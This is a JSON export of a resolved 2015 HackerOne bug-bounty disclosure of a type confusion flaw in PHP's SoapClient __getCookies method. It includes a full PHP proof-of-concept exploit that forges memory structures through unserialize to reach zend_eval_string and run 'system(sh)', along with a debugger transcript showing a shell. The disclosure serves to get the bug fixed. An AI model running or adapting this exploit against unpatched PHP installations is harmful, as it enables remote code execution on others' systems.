{
  "id": 73245,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MzI0NQ==",
  "url": "https://hackerone.com/reports/73245",
  "title": "Type Confusion Vulnerability in SoapClient",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2015-03-01T00:00:00.000Z",
  "submitted_at": "2015-03-01T00:00:00.000Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ryat",
    "url": "/ryat",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/wfyfjk9cawbuzqqdx88azrvxmqt6/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67?response-content-disposition=inline%3B%20filename%3D%22chtg.jpeg%22%3B%20filename%2A%3DUTF-8%27%27chtg.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUHHHDGJL%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T212519Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDvcnmzC5emRVk9TkwlGkmgxqUuU1y1B6dakIL7MwtAhAiBLwFrNg1QUXZfxVxbprLSkYhY0g0RZcG2P5DDexvDtVCqxBQg0EAMaDDAxMzYxOTI3NDg0OSIMJB3X4UkrhzbnGBp%2FKo4FxUD3SZ%2Baocrw5to0JIaYigWWahjq6b3fmWZhtm6qBHWoivYigXnpJtLNNk0k1NqDk4rwIRdEJuqhjbUuHalo8LzDSD8okKlg%2FyF2t6YTkGgAVGT8m6%2B28%2B%2Bef%2FSP0%2BKsLs01%2FMHFZudXcqcZpVcJQo%2B0Lis90iJ1Otz3Qw0RsWl4f6W4GIBvdodiadsdsU8Q3CEcc9ALGXzzgVoWVNQQdN5wYOL%2FdkYF0zRp0djhsiNk2jgFrKOBZUzY3CSmIZve7f8gpzgGTlJ6HRVchrBTGfEZS7aTtfc6ETaQKBT2ssqJZY0ODnzijPowkVmZqPG0RveONvE3nWPB3YPsZn5TAbNApyMmVvD18MITLly%2BqK6E0T%2FPmb5htBbf3SIORSr7IutT3Gvn3xd5K4nrv0J0utqQ1uuGR36VfV3xyuoxwqXmUds4%2FVtXUUe1TBj5Aci%2BT1%2B%2F8h8R7cs52Lvn4fcv2JCjIx3yyP5d1%2Br8UPgabsVh%2BIvIaIRJwoWpuzLktl2B751MNGvyp3AIJ8uUq9cJYKLd%2BOIzdEUiO6B7%2Bd304cipo1mZ0NCsUfw2vj4iuEVS3TJf38qMx3bDzdvDygVoVRtSUrXKMzbe%2BsLrSPAtdoZqPrklnSvtGfIOuI7fYAvIook3sC7Gse82XBW1fN%2FWqgywOEDe8DWP8BKEkX6rvZS3jvLf%2BTIXpWBMP41TqAk8fodumPzkFnxKTWhJ9Ujbt2Qqb6eB2WcaX8YzlTUJWcXxOEYyvLH6KHQJLTeVV4qflKPiu5hjQvENp3YPXv%2Ftj5JQdoysW%2BH6JdfkXEL4Km%2B2U%2FzQNIgLUp8LLX3cIhidRMDzMAEaj7m4mComw4Y%2B6AhQkYo%2F%2F7IHjpvei%2FIDMKy%2FxsYGOrIBoBtnfvzs28UoU%2B8G4olY52gZUbNHLkaKj%2BIwwFWt82Bhwe6u%2Ffl9hStE%2F3heRHBzvwyf1gQxkf94NRstCUiZUnnK%2FRdnGiQ%2FekBscOi3szB0HsDZayqHFhgYL7d%2FEx5VxZn58ytPtUceZ2szKI0TCqo3yohZ5UU82Pj3a9gPJ%2Bf6tbauoAk%2F4cp%2BMT3t9rP4%2B815INpw1YUfr223DbMwWXrDg47FrzH3HLjI7OPV%2BE7mHA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=43f6a7f9022b3966abc51decde5c0cff122beaedfa57149aa4d26e4482abf21b"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUHHHDGJL%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T212519Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDvcnmzC5emRVk9TkwlGkmgxqUuU1y1B6dakIL7MwtAhAiBLwFrNg1QUXZfxVxbprLSkYhY0g0RZcG2P5DDexvDtVCqxBQg0EAMaDDAxMzYxOTI3NDg0OSIMJB3X4UkrhzbnGBp%2FKo4FxUD3SZ%2Baocrw5to0JIaYigWWahjq6b3fmWZhtm6qBHWoivYigXnpJtLNNk0k1NqDk4rwIRdEJuqhjbUuHalo8LzDSD8okKlg%2FyF2t6YTkGgAVGT8m6%2B28%2B%2Bef%2FSP0%2BKsLs01%2FMHFZudXcqcZpVcJQo%2B0Lis90iJ1Otz3Qw0RsWl4f6W4GIBvdodiadsdsU8Q3CEcc9ALGXzzgVoWVNQQdN5wYOL%2FdkYF0zRp0djhsiNk2jgFrKOBZUzY3CSmIZve7f8gpzgGTlJ6HRVchrBTGfEZS7aTtfc6ETaQKBT2ssqJZY0ODnzijPowkVmZqPG0RveONvE3nWPB3YPsZn5TAbNApyMmVvD18MITLly%2BqK6E0T%2FPmb5htBbf3SIORSr7IutT3Gvn3xd5K4nrv0J0utqQ1uuGR36VfV3xyuoxwqXmUds4%2FVtXUUe1TBj5Aci%2BT1%2B%2F8h8R7cs52Lvn4fcv2JCjIx3yyP5d1%2Br8UPgabsVh%2BIvIaIRJwoWpuzLktl2B751MNGvyp3AIJ8uUq9cJYKLd%2BOIzdEUiO6B7%2Bd304cipo1mZ0NCsUfw2vj4iuEVS3TJf38qMx3bDzdvDygVoVRtSUrXKMzbe%2BsLrSPAtdoZqPrklnSvtGfIOuI7fYAvIook3sC7Gse82XBW1fN%2FWqgywOEDe8DWP8BKEkX6rvZS3jvLf%2BTIXpWBMP41TqAk8fodumPzkFnxKTWhJ9Ujbt2Qqb6eB2WcaX8YzlTUJWcXxOEYyvLH6KHQJLTeVV4qflKPiu5hjQvENp3YPXv%2Ftj5JQdoysW%2BH6JdfkXEL4Km%2B2U%2FzQNIgLUp8LLX3cIhidRMDzMAEaj7m4mComw4Y%2B6AhQkYo%2F%2F7IHjpvei%2FIDMKy%2FxsYGOrIBoBtnfvzs28UoU%2B8G4olY52gZUbNHLkaKj%2BIwwFWt82Bhwe6u%2Ffl9hStE%2F3heRHBzvwyf1gQxkf94NRstCUiZUnnK%2FRdnGiQ%2FekBscOi3szB0HsDZayqHFhgYL7d%2FEx5VxZn58ytPtUceZ2szKI0TCqo3yohZ5UU82Pj3a9gPJ%2Bf6tbauoAk%2F4cp%2BMT3t9rP4%2B815INpw1YUfr223DbMwWXrDg47FrzH3HLjI7OPV%2BE7mHA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ebd7d05adf51e4b6f5c82f02aa0d79e36783585553de07f84c26ecb5fdbc2f5d",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUHHHDGJL%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T212519Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDvcnmzC5emRVk9TkwlGkmgxqUuU1y1B6dakIL7MwtAhAiBLwFrNg1QUXZfxVxbprLSkYhY0g0RZcG2P5DDexvDtVCqxBQg0EAMaDDAxMzYxOTI3NDg0OSIMJB3X4UkrhzbnGBp%2FKo4FxUD3SZ%2Baocrw5to0JIaYigWWahjq6b3fmWZhtm6qBHWoivYigXnpJtLNNk0k1NqDk4rwIRdEJuqhjbUuHalo8LzDSD8okKlg%2FyF2t6YTkGgAVGT8m6%2B28%2B%2Bef%2FSP0%2BKsLs01%2FMHFZudXcqcZpVcJQo%2B0Lis90iJ1Otz3Qw0RsWl4f6W4GIBvdodiadsdsU8Q3CEcc9ALGXzzgVoWVNQQdN5wYOL%2FdkYF0zRp0djhsiNk2jgFrKOBZUzY3CSmIZve7f8gpzgGTlJ6HRVchrBTGfEZS7aTtfc6ETaQKBT2ssqJZY0ODnzijPowkVmZqPG0RveONvE3nWPB3YPsZn5TAbNApyMmVvD18MITLly%2BqK6E0T%2FPmb5htBbf3SIORSr7IutT3Gvn3xd5K4nrv0J0utqQ1uuGR36VfV3xyuoxwqXmUds4%2FVtXUUe1TBj5Aci%2BT1%2B%2F8h8R7cs52Lvn4fcv2JCjIx3yyP5d1%2Br8UPgabsVh%2BIvIaIRJwoWpuzLktl2B751MNGvyp3AIJ8uUq9cJYKLd%2BOIzdEUiO6B7%2Bd304cipo1mZ0NCsUfw2vj4iuEVS3TJf38qMx3bDzdvDygVoVRtSUrXKMzbe%2BsLrSPAtdoZqPrklnSvtGfIOuI7fYAvIook3sC7Gse82XBW1fN%2FWqgywOEDe8DWP8BKEkX6rvZS3jvLf%2BTIXpWBMP41TqAk8fodumPzkFnxKTWhJ9Ujbt2Qqb6eB2WcaX8YzlTUJWcXxOEYyvLH6KHQJLTeVV4qflKPiu5hjQvENp3YPXv%2Ftj5JQdoysW%2BH6JdfkXEL4Km%2B2U%2FzQNIgLUp8LLX3cIhidRMDzMAEaj7m4mComw4Y%2B6AhQkYo%2F%2F7IHjpvei%2FIDMKy%2FxsYGOrIBoBtnfvzs28UoU%2B8G4olY52gZUbNHLkaKj%2BIwwFWt82Bhwe6u%2Ffl9hStE%2F3heRHBzvwyf1gQxkf94NRstCUiZUnnK%2FRdnGiQ%2FekBscOi3szB0HsDZayqHFhgYL7d%2FEx5VxZn58ytPtUceZ2szKI0TCqo3yohZ5UU82Pj3a9gPJ%2Bf6tbauoAk%2F4cp%2BMT3t9rP4%2B815INpw1YUfr223DbMwWXrDg47FrzH3HLjI7OPV%2BE7mHA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=784d720ddcf4fdda93b18dbc7c52df34fb1450cd78e6688fbd8d33bb39ec375f"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2015-04-16T00:00:00.000Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2015-04-16T00:00:00.000Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "# Type Confusion Vulnerability in SoapClient\n\nTaoguang Chen <[ () chtg](http://github.com/chtg)> - Write Date: 2015.3.1\n- Release Date: 2015.3.20\n\nA type confusion vulnerability was discovered in SoapClient object's __getCookies() method that can be abused for \nleaking arbitrary memory blocks or execute arbitrary code remotely.\n\nAffected Versions\n------------\nAffected is PHP 5.6 < 5.6.7\nAffected is PHP 5.5 < 5.5.23\nAffected is PHP 5.4 < 5.4.39\nAffected is PHP 5.3 <= 5.3.29\n\nCredits\n------------\nThis vulnerability was disclosed by Taoguang Chen.\n\nDescription\n------------\n```\nPHP_METHOD(SoapClient, __getCookies)\n{\n        zval **cookies, *tmp;\n\n        if (zend_parse_parameters_none() == FAILURE) {\n                return;\n        }\n\n        array_init(return_value);\n\n        if (zend_hash_find(Z_OBJPROP_P(this_ptr), \"_cookies\",\nsizeof(\"_cookies\"), (void **)&cookies) != FAILURE) {\n                zend_hash_copy(Z_ARRVAL_P(return_value), Z_ARRVAL_P(*cookies),\n(copy_ctor_func_t) zval_add_ref, (void *)&tmp, sizeof(zval*));\n        }\n}\n```\n\nThe Z_ARRVAL_P macro leads to pointing a fake array-type ZVAL in\nmemory via a fake HashTable and a fake Bucket. This should result in\narbitrary code execution.\n\nProof of Concept Exploit\n------------\nThe PoC works on standard MacOSX 10.10.3 installation of PHP 5.5.14.\n\n```\n<?php\n\nini_set(\"memory_limit\", -1);\n\nif ($_SERVER['argc'] < 2) {\n        $_SERVER['argv'][1] = 'system(sh);exit;';\n}\n\nsetup_memory();\n\n$exploit = 'O:10:\"SoapClient\":1:{s:8:\"_cookies\";s:'.strlen($hashtable).':\"'.$hashtable.'\";}';\n$z = unserialize($exploit);\n// $z = new SoapClient(null, array('location' => \"\", 'uri' => \"\"));\n// $z->_cookies = $hashtable;\n$z->__getCookies();\n\nfunction setup_memory()\n{\n        global $str, $hashtable;\n        \n        $base = 0x114000020;\n        $bucket_addr = $base;\n        $zval_delta = 0x100;\n        $hashtable_delta = 0x200;\n        $zval_addr = $base + $zval_delta;\n        $hashtable_addr = $base + $hashtable_delta;\n        $func_addr = 0x100351e3d; // zend_eval_string()'s address\n        \n        $bucket  = \"\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\";\n        $bucket .= \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\";\n        $bucket .= ptr2str($bucket_addr + 3*8);\n        $bucket .= ptr2str($zval_addr);\n        $bucket .= ptr2str(0);\n        $bucket .= ptr2str(0);\n        $bucket .= ptr2str(0);\n        $bucket .= ptr2str(0);\n        $bucket .= ptr2str(0);\n        \n        $hashtable  = \"\\x00\\x00\\x00\\x00\";\n        $hashtable .= \"\\x00\\x00\\x00\\x00\";\n        $hashtable .= \"\\x01\\x00\\x00\\x00\";\n        $hashtable .= \"\\x00\\x00\\x00\\x00\";\n        $hashtable .= \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\";\n        $hashtable .= ptr2str(0);\n        $hashtable .= ptr2str($bucket_addr);\n        $hashtable .= ptr2str(0);\n        $hashtable .= ptr2str(0);\n        $hashtable .= ptr2str(0);\n        $hashtable .= \"\\x00\";\n        $hashtable .= \"\\x00\";\n        \n        $zval = ptr2str($hashtable_addr);\n        $zval .= ptr2str(0);\n        $zval .= \"\\x00\\x00\\x00\\x00\";\n        $zval .= \"\\x04\";\n        $zval .= \"\\x00\";\n        $zval .= ptr2str(0);\n        $zval .= ptr2str(0);\n        $zval .= ptr2str(0);\n\n        $shellcode = ptr2str(0);\n        $shellcode .= ptr2str(0);\n        $shellcode .= ptr2str(0);\n        $shellcode .= ptr2str(0);\n        $shellcode .= ptr2str($hashtable_addr + 6*8);\n        $shellcode .= ptr2str(0);\n        $shellcode .= ptr2str(0);\n        $shellcode .= ptr2str($func_addr);\n        $shellcode .= ptr2str($hashtable_addr + 9*8);\n        $shellcode .= \n\"\\x65\\x76\\x61\\x6c\\x28\\x24\\x5f\\x53\\x45\\x52\\x56\\x45\\x52\\x5b\\x27\\x61\\x72\\x67\\x76\\x27\\x5d\\x5b\\x31\\x5d\\x29\\x3b\\x00\";\n// eval($_SERVER['argv'][1]);\n        \n        $part = str_repeat(\"\\x73\", 4096);\n        for ($j=0; $j<strlen($bucket); $j++) {\n                $part[$j] = $bucket[$j];\n        }\n        for ($j=0; $j<strlen($shellcode); $j++) {\n                $part[$j+$hashtable_delta] = $shellcode[$j];\n        }\n        for ($j=0; $j<strlen($zval); $j++) {\n                $part[$j+$zval_delta] = $zval[$j];\n        }\n        \n        $str = str_repeat($part, 1024*1024*256/4096);\n}\n\nfunction ptr2str($ptr)\n{\n        $out = \"\";\n        for ($i=0; $i<8; $i++) {\n                $out .= chr($ptr & 0xff);\n                $ptr >>= 8;\n        }\n        return $out;\n}\n\n?>\n```\n\nTest the PoC on the command line, then any PHP code can be executed:\n\n```\n$ lldb php\n(lldb) target create \"php\"\nCurrent executable set to 'php' (x86_64).\n(lldb) run tcpoc.php 'system\\(sh\\)\\;exit\\;'\nProcess 2606 launched: '/usr/bin/php' (x86_64)\nsh: no job control in this shell\nsh-3.2$ php -v\nPHP 5.5.14 (cli) (built: Jan  8 2015 22:33:37)\nCopyright (c) 1997-2014 The PHP Group\nZend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies\nsh-3.2$ exit\nexit\nProcess 2606 exited with status = 0 (0x00000000)\n(lldb)\n```",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 5,
  "voters": [
    "xingguang",
    "smodnix",
    "ryat",
    "shivammusic",
    "dyabla"
  ],
  "structured_scope": {
    "databaseId": 84120,
    "asset_type": "OTHER",
    "asset_identifier": "PHP",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
